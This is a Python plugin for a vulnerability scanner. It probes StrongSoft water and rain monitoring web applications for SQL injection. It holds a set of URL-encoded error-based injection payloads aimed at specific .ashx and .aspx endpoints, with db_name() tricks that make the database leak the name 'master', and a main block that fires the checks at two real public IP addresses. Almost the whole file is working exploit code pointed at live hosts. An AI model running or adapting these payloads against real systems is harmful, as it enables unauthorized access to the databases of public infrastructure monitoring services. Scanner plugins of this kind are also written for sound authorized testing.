#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author:小光
#refer:http://www.wooyun.org/bugs/wooyun-2010-099088
#refer:http://www.wooyun.org/bugs/wooyun-2010-099084
#refer:http://www.wooyun.org/bugs/wooyun-2010-099077
#refer:http://www.wooyun.org/bugs/wooyun-2010-099074
#refer:http://www.wooyun.org/bugs/wooyun-2010-097446
#refer:http://www.wooyun.org/bugs/wooyun-2010-097445
#refer:http://www.wooyun.org/bugs/wooyun-2010-095953
#refer:http://www.wooyun.org/bugs/wooyun-2010-094994
#refer:http://www.wooyun.org/bugs/wooyun-2010-094226

import time

def assign(service, arg):
    if service == "strongsoft":
        return True, arg
        
        
        
def audit(arg): 
    payloads={
        'Public/DataAccess/Water/WaterChartDataProvider.ashx?dateForAjax=656':'stcd=63%27%20and%201172%3Ddb_name%281%29%20AND%20%271%27%3D%271&start=2015-01-18 08:00:00&end=2015-01-18 13:00:00',
        'Public/DataAccess/Rain/RainChartDataProvider.ashx?dateForAjax=200':'stcd=63%27%20and%201172%3Ddb_name%281%29%20AND%20%271%27%3D%271&start=2015-01-18 08:00:00&end=2015-01-18 13:00:00',
        'Public/DataAccess/GeneralModule/doDbAccess.ashx?dateForAjax=364':'params=0125%27%29%20AND%201172%3Ddb_name%281%29%20AND%20%28%271%27%3D%271&sqlkey=Map_S_GetEnnuById_ZWP',
        'Report/AjaxHandle/ReportContent/SpecialContent/DataSourceCZYL.ashx?_=1421675671108':'StartTime=2015%E5%B9%B401%E6%9C%8819%E6%97%A508%E6%97%B6&EndTime=2015%E5%B9%B401%E6%9C%8819%E6%97%A522%E6%97%B6&ReportID=Report11&UrlSqlWhere= and stcd in %28%271%27%2C%27104%27%2C%27105%27%2C%27106%27%2C%27107%27%2C%27108%27%2C%27109%27%2C%2711%27%2C%27110%27%2C%27111%27%2C%27112%27%2C%27113%27%2C%27114%27%2C%27115%27%2C%27116%27%2C%27117%27%2C%27118%27%2C%27119%27%2C%27120%27%2C%27121%27%2C%27122%27%2C%27123%27%2C%27124%27%2C%27125%27%2C%27126%27%2C%27127%27%2C%27128%27%2C%27129%27%2C%27131%27%2C%27132%27%2C%27133%27%2C%27134%27%2C%27135%27%2C%27136%27%2C%27137%27%2C%27138%27%2C%27139%27%2C%2714%27%2C%27140%27%2C%27141%27%2C%27142%27%2C%27143%27%2C%27144%27%2C%27145%27%2C%27146%27%2C%27147%27%2C%27148%27%2C%27149%27%2C%2715%27%2C%27150%27%2C%27151%27%2C%27152%27%2C%27153%27%2C%27154%27%2C%27156%27%2C%27157%27%2C%27158%27%2C%2716%27%2C%2717%27%2C%2718%27%2C%272%27%2C%2724%27%2C%2725%27%2C%2726%27%2C%2728%27%2C%2729%27%2C%273%27%2C%2730%27%2C%2733%27%2C%2734%27%2C%2735%27%2C%2737%27%2C%2738%27%2C%2739%27%2C%274%27%2C%2744%27%2C%2746%27%2C%2747%27%2C%2748%27%2C%2750%27%2C%2752%27%2C%2753%27%2C%2754%27%2C%2756%27%2C%2757%27%2C%2758%27%2C%2759%27%2C%2760%27%2C%2761%27%2C%2762%27%2C%2763%27%2C%2764%27%2C%2765%27%2C%2766%27%2C%2769%27%2C%277%27%2C%2770%27%2C%2771%27%2C%2772%27%2C%2773%27%2C%2774%27%2C%2775%27%2C%2776%27%2C%2777%27%2C%2778%27%2C%2779%27%2C%278%27%2C%2780%27%2C%2781%27%2C%2782%27%2C%2783%27%2C%2784%27%2C%2785%27%2C%2786%27%2C%2787%27%2C%2796%27%2C%2797%27%2C%2798%27%29%20AND%207572%3Ddb_name%281%29'
        
        
        }
    for payload in payloads:
        url = arg+payload
        code, head,res, errcode, _ = curl.curl2(url,payloads[payload])
        if code == 500 or code ==200 and 'master' in res :
            security_hole(url + "\n"+"postdata:"+payloads[payload]+"   :sql Injection")
            
    payloads = {
        'MapInfoShow/InfoMain.aspx?menuUrl=InfoMenuReservoir.aspx&ADCD=rs046':'%27%2b%28SELECT%20%27VcEO%27%20WHERE%203750%3D3750%20AND%203455%3Ddb_name%281%29%29%2b%27',
        'MapInfoShow/InfoDetail.aspx?keycol=RSCD&tabnm=StrongWater.dbo.RS_Info_B&ADCD=rs054':'%27%2b%28SELECT%20%27VcEO%27%20WHERE%203750%3D3750%20AND%203455%3Ddb_name%281%29%29%2b%27',
        'public/DataAccess/GeneralModule/GetFeatureInfo.ashx?SqlKey=Map_S_GetReseFeatureInfo_ZWP&STCD=rs048':'%27%20and%201%3Ddb_name%281%29--',
        'public/DataAccess/GeneralModule/doDbAccess.ashx?sqlkey=Map_S_GetReseData_ZWP¶ms=%274%27':'%29%20%20and%20%281%20%3Ddb_name%281%29',
        'SystemManage/Plan/GetArea.ashx?sqlkey=Map_S_GetSubAreaByPID_PX&pid=1':'%27%2b%28SELECT%20%27InPV%27%20WHERE%207481%3D7481%20AND%201135%3DCONVERT%28INT%2Cdb_name%281%29%29%29%2b%27'
        }
    for payload in payloads:
        url = arg + payload + payloads[payload]
        code, head,res, errcode, _ = curl.curl2(url)
        if code == 500 and 'master' in res :
            security_hole(arg + payload + "   :sql Injection")







if __name__ == '__main__': 
    from dummy import * 
    audit(assign('strongsoft', 'http://61.153.79.222:3050/')[1])
    audit(assign('strongsoft', 'http://183.129.136.54:3050/')[1])